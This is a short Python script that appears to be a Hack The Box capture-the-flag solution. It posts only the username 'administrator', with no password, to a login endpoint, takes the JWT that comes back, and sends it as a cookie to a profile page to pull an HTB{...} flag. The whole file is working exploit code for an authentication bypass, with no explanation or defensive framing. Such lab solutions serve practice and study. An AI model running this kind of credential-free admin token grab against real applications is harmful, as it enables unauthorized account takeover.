import requests
import sys
import re

url = sys.argv[1]
url_jwt = f"http://{url}/index.php/login"
url_flag = f"http://{url}/index.php/profile"

headers_jwt = {
    "Content-type": "application/json",
    }

jwt_data = {
    "username":"administrator"
}


r_jwt = requests.post(url_jwt, json=jwt_data, headers=headers_jwt)
JWT = r_jwt.text
jwt_token = re.search(r'"token"\s*:\s*"([^"]+)"', JWT).group(1)

headers_flag = {
    "Content-type": "application/json",
    "Cookie": f"token={jwt_token}"
}

r_get = requests.get(url_flag, headers=headers_flag)

flag = re.search(r"HTB\{.*?\}", r_get.text)
if flag:
    print(flag.group(0))

